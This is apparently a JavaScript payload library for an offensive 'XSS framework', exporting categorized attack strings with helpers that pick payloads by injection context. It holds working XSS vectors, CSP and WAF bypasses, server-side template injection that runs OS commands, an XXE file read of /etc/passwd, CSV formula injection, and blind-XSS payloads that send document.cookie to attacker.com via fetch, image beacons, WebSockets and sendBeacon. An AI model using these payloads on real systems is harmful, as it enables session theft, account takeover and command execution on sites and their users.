/**
 * Elite XSS Framework v8.0 - Advanced Payload Library
 * Top 0.1% XSS vectors and techniques (2025 Edition)
 */

(function(exports) {
  'use strict';

  const AdvancedPayloads = {
    
    /**
     * MUTATION XSS (mXSS) - Browser mutation vectors
     * Bypasses sanitizers through browser parsing quirks
     */
    mutationXSS: [
      // Noscript mutation
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<noscript><style></noscript><img src=x onerror=alert(1)>',
      
      // Style mutation
      '<style>*{}</style><img src=x onerror=alert(1)>',
      '<style><img src=x onerror=alert(1)></style>',
      '<style><!--</style><script>alert(1)</script>',
      
      // SVG mutation
      '<svg><style><img/src=x onerror=alert(1)></style>',
      '<svg><style><!--</style><script>alert(1)</script>',
      '<math><style><img src=x onerror=alert(1)></style></math>',
      
      // Form mutation
      '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
      '<form><button formaction=javascript:alert(1)>CLICK</button>',
      
      // Listing mutation
      '<listing><img src=x onerror=alert(1)></listing>',
      '<xmp><img src=x onerror=alert(1)></xmp>',
      
      // Table mutation
      '<table><img src=x onerror=alert(1)></table>',
      '<table><td><img src=x onerror=alert(1)></td></table>',
      
      // Namespace confusion
      '<svg><![CDATA[<image xlink:href="]]><img src=x onerror=alert(1)//">',
      '<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></desc></svg>'
    ],

    /**
     * PROTOTYPE POLLUTION - JavaScript prototype chain exploitation
     */
    prototypePollution: [
      // URL-based pollution
      '?__proto__[xss]=<img/src/onerror=alert(1)>',
      '?__proto__[innerHTML]=<img/src/onerror=alert(1)>',
      '?constructor[prototype][xss]=<script>alert(1)</script>',
      
      // JSON-based pollution
      '{"__proto__":{"xss":"<img src=x onerror=alert(1)>"}}',
      '{"constructor":{"prototype":{"xss":"<script>alert(1)</script>"}}}',
      '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
      
      // Array-based pollution
      '["__proto__","xss","<img src=x onerror=alert(1)>"]',
      
      // Nested pollution
      '?__proto__.xss=<img/src/onerror=alert(1)>',
      '?__proto__.constructor.prototype.xss=<script>alert(1)</script>',
      
      // Deep pollution
      '?__proto__.__proto__.xss=<img src=x onerror=alert(1)>',
      
      // isAdmin pollution (common vulnerable pattern)
      '?__proto__.isAdmin=true',
      '{"__proto__":{"isAdmin":true,"role":"admin"}}',
      
      // Function pollution
      '?__proto__.toString=alert(1)',
      '{"__proto__":{"toString":"alert(1)"}}',
      
      // Template pollution
      '?__proto__.template=<img src=x onerror=alert(1)>',
      '{"__proto__":{"template":"<script>alert(1)</script>"}}'
    ],

    /**
     * DOM CLOBBERING - Exploiting named element access
     */
    domClobbering: [
      // Form clobbering
      '<form name=x><input name=y value="<img src=x onerror=alert(1)>"></form>',
      '<form name=x><input name=innerHTML></form>',
      '<form id=x><input id=y></form>',
      
      // Image clobbering
      '<img name=x><img name=x><img name=x value="<img src=x onerror=alert(1)>">',
      '<a id=x><a id=x><a id=x><a id=x value="<img src=x onerror=alert(1)>">',
      
      // Nested clobbering
      '<form name=x><input name=y><input name=z></form>',
      
      // Attributes clobbering
      '<form name=attributes><input name=id value=xss></form>',
      '<img name=attributes value="<img src=x onerror=alert(1)>">',
      
      // HTMLCollection clobbering
      '<a id=x>1</a><a id=x>2</a>',
      '<form id=x><input id=x></form>',
      
      // Window property clobbering
      '<iframe name=alert></iframe>',
      '<iframe name=console></iframe>',
      '<form name=document></form>',
      
      // Function clobbering
      '<iframe name=setTimeout></iframe>',
      '<form name=eval></form>'
    ],

    /**
     * CSP BYPASS - Content Security Policy evasion
     */
    cspBypass: [
      // Script gadgets (AngularJS)
      '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js"></script><div ng-app ng-csp>{{$eval.constructor(\'alert(1)\')()}}</div>',
      '<div ng-app ng-csp>{{constructor.constructor(\'alert(1)\')()}}</div>',
      
      // JSONP abuse
      '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
      '<script src="https://www.google.com/complete/search?client=chrome&q=x&jsonp=alert(1)"></script>',
      
      // Dangling markup
      '<img src=\'https://attacker.com?',
      '<style>@import\'//attacker.com?',
      
      // Base tag hijacking
      '<base href="https://attacker.com/">',
      '<base href="javascript:alert(1)//">',
      
      // Meta refresh
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
      
      // Link prefetch
      '<link rel="prefetch" href="https://attacker.com/xss.js">',
      '<link rel="dns-prefetch" href="//attacker.com">',
      
      // Iframe srcdoc (CSP doesn\'t apply)
      '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
      '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
      
      // Service Worker bypass
      '<script>navigator.serviceWorker.register("sw.js")</script>',
      
      // Import maps
      '<script type="importmap">{"imports":{"x":"data:text/javascript,alert(1)"}}</script><script type="module">import"x"</script>'
    ],

    /**
     * WAF BYPASS - Web Application Firewall evasion
     */
    wafBypass: [
      // Case variation
      '<ScRiPt>alert(1)</sCrIpT>',
      '<IMG SRC=x onerror=alert(1)>',
      '<ScRiPt sRc=//xss.rocks/xss.js></ScRiPt>',
      
      // Encoding mixed
      '<script>&#97;lert(1)</script>',
      '<script>al\\u0065rt(1)</script>',
      '<img src=x on\\u0065rror=alert(1)>',
      
      // Null bytes
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      
      // Double encoding
      '%253Cscript%253Ealert(1)%253C/script%253E',
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      
      // Tab/newline variations
      '<img\x09src=x\x0Aonerror=alert(1)>',
      '<svg\x0Conload=alert(1)>',
      '<script\x0D>alert(1)</script>',
      
      // HTML entities
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
      
      // Comment breaking
      '<script><!--<script>alert(1)//--></script>',
      '<!--><script>alert(1)</script>-->',
      
      // Attribute breaking
      '"><script>alert(1)</script>',
      '\' onload=alert(1) x=\'',
      '" onload="alert(1)" x="',
      
      // Backticks
      '<script>alert`1`</script>',
      '<img src=x onerror=alert`1`>',
      
      // Template literals
      '<script>${alert(1)}</script>',
      '<img src=x onerror=${alert(1)}>',
      
      // Unicode normalization
      '<script>alert(1)</script>',
      '＜script＞alert(1)＜/script＞',
      
      // RTL override
      '<‮script>alert(1)</script>',
      
      // Zero-width characters
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>'
    ],

    /**
     * POLYGLOT PAYLOADS - Multi-context exploitation
     */
    polyglot: [
      // Ultimate polyglot
      'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert()//>',
      
      // Compact polyglot
      'javascript:"/*\'/*`/*" /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onload=alert()//&gt;',
      
      // Multi-context polyglot
      'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e',
      
      // HTML/JS/URL polyglot
      '\'"><img src=x onerror=alert(1)//',
      '\'"</script><script>alert(1)</script>',
      
      // JSON/JS polyglot
      '{"xss":"</script><script>alert(1)</script>"}',
      
      // XML/HTML polyglot
      '<![CDATA[<img src=x onerror=alert(1)>]]>',
      
      // SVG polyglot
      '<svg/onload=alert(1)></svg><!--',
      
      // Comment polyglot
      '<!--<script>alert(1)</script>-->'
    ],

    /**
     * TEMPLATE INJECTION - SSTI/CSTI exploitation
     */
    templateInjection: {
      angular: [
        '{{constructor.constructor(\'alert(1)\')()}}',
        '{{$eval.constructor(\'alert(1)\')()}}',
        '{{$on.constructor(\'alert(1)\')()}}',
        '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}',
        '{{{}[\'constructor\'][\'constructor\'](\'alert(1)\')()}}',
        '{{$new.constructor(\'alert(1)\')()}}',
        '{{$new.constructor.constructor(\'alert(1)\')()}}',
        '{{\'\'.constructor.prototype.charAt=[].join;$eval(\'x=alert(1)\');}}',
        '{{a=toString().constructor.prototype;a.charAt=a.trim;$eval(\'a,alert(1)\');}}',
        '{{[].pop.constructor(\'alert(1)\')()}}'
      ],
      
      vue: [
        '{{_c.constructor(\'alert(1)\')()}}',
        '{{constructor.constructor(\'alert(1)\')()}}',
        '{{$el.constructor.constructor(\'alert(1)\')()}}',
        '{{$options.constructor.constructor(\'alert(1)\')()}}',
        '{{$root.constructor.constructor(\'alert(1)\')()}}',
        '{{this.constructor.constructor(\'alert(1)\')()}}',
        '{{[].constructor.constructor(\'alert(1)\')()}}'
      ],
      
      react: [
        '{this.props.dangerouslySetInnerHTML.__html="<img src=x onerror=alert(1)>"}',
        '{React.createElement(\'img\',{src:\'x\',onerror:\'alert(1)\'})}'
      ],
      
      handlebars: [
        '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return alert(1);"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
        '{{constructor.constructor(\'alert(1)\')()}}'
      ],
      
      jinja2: [
        '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
        '{{7*7}}[[5*5]]',
        '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
        '{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'id\').read()}}'
      ],
      
      twig: [
        '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
        '{{7*7}}[[5*5]]',
        '{{["id"]|filter("system")}}'
      ]
    },

    /**
     * UNICODE & ENCODING - Normalization attacks
     */
    unicode: [
      // Unicode escapes
      '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
      '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
      
      // Octal escapes
      '\\74script\\76alert(1)\\74/script\\76',
      
      // Hex escapes
      '\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3ealert(1)\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e',
      
      // Full-width characters
      '＜script＞alert(1)＜/script＞',
      '＜img src=x onerror=alert(1)＞',
      
      // Homograph attacks
      '<sсript>alert(1)</script>', // Cyrillic 'с'
      '<ѕcript>alert(1)</script>', // Cyrillic 'ѕ'
      
      // Zero-width characters
      '<script>alert​(1)</script>', // Zero-width space
      '<img src=x onerror=alert‌(1)>', // Zero-width non-joiner
      
      // Combining characters
      '<script>a\u0301lert(1)</script>',
      
      // Overlong UTF-8
      '%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE',
      
      // UTF-7
      '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
      
      // Mixed encoding
      '\\u003cimg src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)\\u003e'
    ],

    /**
     * BLIND XSS - Out-of-band detection
     */
    blindXSS: [
      // Image beacon
      '<img src="https://attacker.com/xss?cookie="+document.cookie>',
      '<script>new Image().src="https://attacker.com/xss?"+document.cookie</script>',
      
      // Fetch beacon
      '<script>fetch("https://attacker.com/xss?"+btoa(document.cookie))</script>',
      
      // XMLHttpRequest beacon
      '<script>var x=new XMLHttpRequest();x.open("GET","https://attacker.com/xss?"+document.cookie);x.send()</script>',
      
      // DNS exfiltration
      '<script>document.location="http://"+document.cookie+".attacker.com"</script>',
      
      // WebSocket exfiltration
      '<script>var ws=new WebSocket("wss://attacker.com");ws.onopen=function(){ws.send(document.cookie)}</script>',
      
      // Navigator.sendBeacon
      '<script>navigator.sendBeacon("https://attacker.com/xss",document.cookie)</script>',
      
      // Delayed execution
      '<script>setTimeout(function(){new Image().src="https://attacker.com/xss?"+document.cookie},5000)</script>',
      
      // Event-based
      '<input onfocus="fetch(\'https://attacker.com/xss?\'+document.cookie)" autofocus>',
      '<body onload="new Image().src=\'https://attacker.com/xss?\'+document.cookie">',
      
      // Storage-based persistence
      '<script>localStorage.xss="<img src=https://attacker.com/xss?"+document.cookie+">";</script>'
    ],

    /**
     * CONTEXT-SPECIFIC PAYLOADS
     */
    contextSpecific: {
      javascript: [
        '\'-alert(1)-\'',
        '\';alert(1)//',
        '\');alert(1)//',
        '\')}};alert(1);//',
        '\'+alert(1)+\'',
        '`${alert(1)}`',
        '(alert(1))',
        '[alert(1)]'
      ],
      
      attribute: [
        '" onload="alert(1)',
        '\' onload=\'alert(1)',
        ' onload=alert(1) x=',
        '"><img src=x onerror=alert(1)>',
        '\' autofocus onfocus=alert(1) x=\'',
        '" autofocus onfocus="alert(1)" x="'
      ],
      
      href: [
        'javascript:alert(1)',
        'javascript:alert(1)//',
        'javascript:alert`1`',
        'javascript:\\u0061lert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
      ],
      
      src: [
        'data:text/javascript,alert(1)',
        'data:application/javascript,alert(1)',
        '//javascript:alert(1)//evil.com',
        'https://xss.rocks/xss.js'
      ],
      
      style: [
        'expression(alert(1))',
        'background:url(javascript:alert(1))',
        '@import\'javascript:alert(1)\'',
        'x:expression(alert(1))',
        '-moz-binding:url(//evil.com/xss.xml#xss)'
      ],
      
      svg: [
        '<svg/onload=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
        '<svg><animatetransform onbegin=alert(1)>',
        '<svg><set attributename=onload to=alert(1)>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
      ]
    },

    /**
     * OBFUSCATION TECHNIQUES
     */
    obfuscated: [
      // JSFuck
      '[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()',
      
      // Hieroglyphy
      '([,ウ,,,,ラ,,ク,,,ソ,,,フ]=[]+{},[ネ,ホ,ヌ,セ,,ミ,,ハ,,,,ヒ]=[!ウ+ウ][ウ][ウ+ウ+ウ+ラ+ク+ソ])[ツ=ハ+ヒ+ホ+ネ+ヌ+ミ+ソ+ネ+セ+ク][ツ](ミ+ハ+セ+ヒ+"(ウ)")();',
      
      // Aaencode (sample - full version too long)
      '(ﾟДﾟ)[ﾟoﾟ]+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)',
      
      // Base64 encoded
      'eval(atob("YWxlcnQoMSk="))',
      
      // String concatenation
      'eval("al"+"ert(1)")',
      'window["al"+"ert"](1)',
      
      // Array join
      'eval([]["const"+"ructor"]["const"+"ructor"]("ale"+"rt(1)")())',
      
      // Regex obfuscation
      'eval(/alert/.source+"(1)")',
      
      // Template literal
      'eval`al${""}ert(1)`',
      
      // Unicode property escapes
      'eval("\\u0061\\u006c\\u0065\\u0072\\u0074(1)")',
      
      // Octal escapes
      'eval("\\141\\154\\145\\162\\164(1)")'
    ],

    /**
     * BROWSER-SPECIFIC VECTORS
     */
    browserSpecific: {
      chrome: [
        '<script src="chrome-extension://[ID]/payload.js"></script>',
        '<link rel="import" href="chrome-extension://[ID]/payload.html">',
        '<object data="chrome-extension://[ID]/payload.html"></object>'
      ],
      
      firefox: [
        '<script src="moz-extension://[ID]/payload.js"></script>',
        '<img src=x onerror="Components.utils.import(\'resource://gre/modules/Services.jsm\');alert(1)">'
      ],
      
      safari: [
        '<script>webkit.messageHandlers.callbackHandler.postMessage("alert(1)")</script>',
        '<img src=x onerror="webkit.messageHandlers.iOS.postMessage(\'xss\')">'
      ],
      
      edge: [
        '<script src="ms-appx-web:///payload.js"></script>',
        '<x-ms-webview src="ms-appx:///payload.html"></x-ms-webview>'
      ],
      
      ie: [
        '<script defer src=//xss></script>',
        '<div style="behavior:url(#default#userData)" id=x></div>',
        '<?import namespace="t" implementation="#default#time2">',
        '<comment><img src="</comment><img src=x onerror=alert(1)//">'
      ]
    },

    /**
     * FILE TYPE SPECIFIC
     */
    fileTypeSpecific: {
      pdf: [
        '/AA /O /S /JavaScript /JS (alert(1))',
        '/Names [(EmbeddedFile) /EF /F (payload.js)]'
      ],
      
      swf: [
        'http://example.com/xss.swf?callback=alert(1)',
        '<embed src="xss.swf" allowscriptaccess="always">'
      ],
      
      xml: [
        '<?xml version="1.0"?><root><![CDATA[<script>alert(1)</script>]]></root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
      ],
      
      json: [
        '{"xss":"</script><script>alert(1)</script>"}',
        '{"__proto__":{"xss":"<img src=x onerror=alert(1)>"}}'
      ],
      
      csv: [
        '=1+1+cmd|/C calc',
        '@SUM(1+1)*cmd|/C calc',
        '+cmd|/C calc',
        '-cmd|/C calc'
      ]
    },

    /**
     * EVENT HANDLERS - All possible event handlers
     */
    eventHandlers: [
      'onload', 'onerror', 'onclick', 'onmouseover', 'onmouseout', 'onmousemove',
      'onmousedown', 'onmouseup', 'onfocus', 'onblur', 'onchange', 'onsubmit',
      'onkeydown', 'onkeyup', 'onkeypress', 'ondblclick', 'oncontextmenu',
      'oninput', 'onselect', 'onscroll', 'ondrag', 'ondrop', 'ondragstart',
      'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'onwheel',
      'onanimationstart', 'onanimationend', 'onanimationiteration',
      'ontransitionend', 'onloadstart', 'onprogress', 'onloadeddata',
      'oncanplay', 'oncanplaythrough', 'ontimeupdate', 'onvolumechange',
      'onseeking', 'onseeked', 'onplay', 'onplaying', 'onpause', 'onended',
      'onwaiting', 'onstalled', 'onsuspend', 'onemptied', 'ondurationchange',
      'onbeforeunload', 'onhashchange', 'onpageshow', 'onpagehide',
      'onpopstate', 'onstorage', 'onoffline', 'ononline', 'onmessage',
      'onresize', 'ontoggle', 'onshow', 'onratechange', 'oninvalid',
      'onbegin', 'onrepeat', 'onforminput', 'onformchange', 'onpropertychange',
      'onfilterchange', 'onreadystatechange', 'onlosecapture', 'onstart',
      'onfinish', 'onbounce', 'onactivate', 'onbeforeactivate', 'onbeforecopy',
      'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste',
      'onbeforeupdate', 'oncellchange', 'ondataavailable', 'ondatasetchanged',
      'ondatasetcomplete', 'ondeactivate', 'onerrorupdate', 'onhelp',
      'onlayoutcomplete', 'onlosecapture', 'onmouseenter', 'onmouseleave',
      'onmovestart', 'onmoveend', 'onresizestart', 'onresizeend',
      'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted',
      'onafterprint', 'onbeforeprint', 'onafterupdate', 'oncut', 'oncopy',
      'onpaste', 'onsearch', 'onselectstart', 'onabort'
    ],

    /**
     * HTML TAGS - All tags that can execute JavaScript
     */
    xssTags: [
      'script', 'img', 'svg', 'iframe', 'object', 'embed', 'body', 'video',
      'audio', 'input', 'button', 'form', 'select', 'textarea', 'keygen',
      'frameset', 'marquee', 'details', 'link', 'meta', 'base', 'style',
      'isindex', 'applet', 'bgsound', 'ilayer', 'layer', 'xml', 'math',
      'animate', 'animatetransform', 'set', 'image', 'use', 'foreignobject'
    ],

    /**
     * FILTERS & BYPASS TECHNIQUES
     */
    filterBypass: {
      // Space bypass
      spaces: ['/', '/**/', '/**/','%0a', '%0d', '%09', '%0b', '%0c', '\x0a', '\x0d', '\x09'],
      
      // Quote bypass
      quotes: ['String.fromCharCode(88,83,83)', '`', '\u0027', '\u0022'],
      
      // Parentheses bypass
      parentheses: ['throw onerror=alert,1', '`${alert(1)}`', '{onerror=alert}throw 1'],
      
      // Dot bypass
      dots: ['["constructor"]', '[\'constructor\']', 'constructor'],
      
      // Script bypass
      scriptTags: ['scr<script>ipt', '<scr\x00ipt>', '<scr\nipt>', 'scr<!---->ipt'],
      
      // On event bypass
      onPrefix: ['on<x>click', 'o<x>nclick', 'on<!---->click']
    },

    /**
     * REGEX BYPASS PATTERNS
     */
    regexBypass: [
      // Bypass /script/i
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<script><!--<script>alert(1)</script>-->',
      '<script src="data:text/javascript,alert(1)">',
      
      // Bypass /on\w+=/i
      '<img src=x o<x>nerror=alert(1)>',
      '<svg/o<!---->nload=alert(1)>',
      
      // Bypass /alert|prompt|confirm/i
      '<script>top["al"+"ert"](1)</script>',
      '<script>window["al\x65rt"](1)</script>',
      '<script>[]["constructor"]["constructor"]("alert(1)")()</script>',
      
      // Bypass /<|>/
      '\u003cscript\u003ealert(1)\u003c/script\u003e',
      '&lt;script&gt;alert(1)&lt;/script&gt;'
    ],

    /**
     * TIME-BASED DETECTION VECTORS
     */
    timeBased: [
      '<script>if(document.domain=="target.com")new Image().src="//attacker.com?xss=1"</script>',
      '<img src=x onerror="setTimeout(function(){alert(1)},5000)">',
      '<script>setInterval(function(){if(document.cookie)fetch("//attacker.com?c="+document.cookie)},1000)</script>'
    ],

    /**
     * LENGTH-RESTRICTED PAYLOADS (for limited input fields)
     */
    short: [
      // Under 20 chars
      '<svg/onload=alert(1)>',
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      
      // Under 30 chars
      '<iframe src=javascript:alert(1)>',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      
      // Under 40 chars
      '<marquee onstart=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<select autofocus onfocus=alert(1)>'
    ]
  };

  /**
   * Get payloads by category
   */
  AdvancedPayloads.getByCategory = (category) => {
    return AdvancedPayloads[category] || [];
  };

  /**
   * Get all payloads as flat array
   */
  AdvancedPayloads.getAll = () => {
    const allPayloads = [];
    
    const flatten = (obj) => {
      for (const key in obj) {
        const value = obj[key];
        if (Array.isArray(value)) {
          allPayloads.push(...value);
        } else if (typeof value === 'object' && value !== null) {
          flatten(value);
        }
      }
    };
    
    flatten(AdvancedPayloads);
    return allPayloads;
  };

  /**
   * Get payloads by context
   */
  AdvancedPayloads.getByContext = (context) => {
    switch(context) {
      case 'html':
        return [
          ...AdvancedPayloads.mutationXSS,
          ...AdvancedPayloads.domClobbering,
          ...AdvancedPayloads.polyglot
        ];
      
      case 'javascript':
        return [
          ...AdvancedPayloads.contextSpecific.javascript,
          ...AdvancedPayloads.prototypePollution,
          ...Object.values(AdvancedPayloads.templateInjection).flat()
        ];
      
      case 'attribute':
        return AdvancedPayloads.contextSpecific.attribute;
      
      case 'url':
        return [
          ...AdvancedPayloads.contextSpecific.href,
          ...AdvancedPayloads.prototypePollution.filter(p => p.startsWith('?'))
        ];
      
      case 'css':
        return AdvancedPayloads.contextSpecific.style;
      
      case 'svg':
        return AdvancedPayloads.contextSpecific.svg;
      
      default:
        return AdvancedPayloads.polyglot;
    }
  };

  /**
   * Get WAF-specific bypass payloads
   */
  AdvancedPayloads.getWAFBypass = (wafType) => {
    return [
      ...AdvancedPayloads.wafBypass,
      ...AdvancedPayloads.unicode,
      ...AdvancedPayloads.filterBypass.scriptTags.map(tag => `<${tag}>alert(1)</${tag}>`)
    ];
  };

  /**
   * Generate context-aware payload
   */
  AdvancedPayloads.generateForContext = (context, marker) => {
    const payloads = AdvancedPayloads.getByContext(context);
    
    // Replace alert(1) with marker for detection
    return payloads.map(payload => 
      payload.replace(/alert\(1\)/g, `alert("${marker}")`)
             .replace(/alert\(\'1\'\)/g, `alert("${marker}")`)
             .replace(/alert\`1\`/g, `alert("${marker}")`)
    );
  };

  /**
   * Get payload statistics
   */
  AdvancedPayloads.getStats = () => {
    return {
      mutationXSS: AdvancedPayloads.mutationXSS.length,
      prototypePollution: AdvancedPayloads.prototypePollution.length,
      domClobbering: AdvancedPayloads.domClobbering.length,
      cspBypass: AdvancedPayloads.cspBypass.length,
      wafBypass: AdvancedPayloads.wafBypass.length,
      polyglot: AdvancedPayloads.polyglot.length,
      templateInjection: Object.values(AdvancedPayloads.templateInjection).flat().length,
      unicode: AdvancedPayloads.unicode.length,
      blindXSS: AdvancedPayloads.blindXSS.length,
      obfuscated: AdvancedPayloads.obfuscated.length,
      total: AdvancedPayloads.getAll().length
    };
  };

  // Export the module
  exports.mutationXSS = AdvancedPayloads.mutationXSS;
  exports.prototypePollution = AdvancedPayloads.prototypePollution;
  exports.domClobbering = AdvancedPayloads.domClobbering;
  exports.cspBypass = AdvancedPayloads.cspBypass;
  exports.wafBypass = AdvancedPayloads.wafBypass;
  exports.polyglot = AdvancedPayloads.polyglot;
  exports.templateInjection = AdvancedPayloads.templateInjection;
  exports.unicode = AdvancedPayloads.unicode;
  exports.blindXSS = AdvancedPayloads.blindXSS;
  exports.contextSpecific = AdvancedPayloads.contextSpecific;
  exports.obfuscated = AdvancedPayloads.obfuscated;
  exports.browserSpecific = AdvancedPayloads.browserSpecific;
  exports.fileTypeSpecific = AdvancedPayloads.fileTypeSpecific;
  exports.eventHandlers = AdvancedPayloads.eventHandlers;
  exports.xssTags = AdvancedPayloads.xssTags;
  exports.filterBypass = AdvancedPayloads.filterBypass;
  exports.regexBypass = AdvancedPayloads.regexBypass;
  exports.short = AdvancedPayloads.short;
  
  exports.getByCategory = AdvancedPayloads.getByCategory;
  exports.getAll = AdvancedPayloads.getAll;
  exports.getByContext = AdvancedPayloads.getByContext;
  exports.getWAFBypass = AdvancedPayloads.getWAFBypass;
  exports.generateForContext = AdvancedPayloads.generateForContext;
  exports.getStats = AdvancedPayloads.getStats;

})(exports);